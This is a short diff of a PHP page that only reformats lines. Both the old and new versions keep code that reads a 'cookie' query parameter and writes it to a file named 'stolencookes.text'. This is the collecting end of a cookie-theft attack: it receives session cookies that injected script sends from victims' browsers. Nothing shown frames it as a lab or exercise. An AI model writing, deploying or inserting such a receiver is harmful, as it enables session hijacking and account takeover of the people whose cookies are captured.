@@ -1,9 +1,6 @@
 <?php 
-
-$cookie = $_GET['cookie'];
-
-file_put_contents('stolencookes.text', $cookie);
-
+    $cookie = $_GET['cookie'];
+    file_put_contents('stolencookes.text', $cookie);
 ?>
 
 <!doctype html>
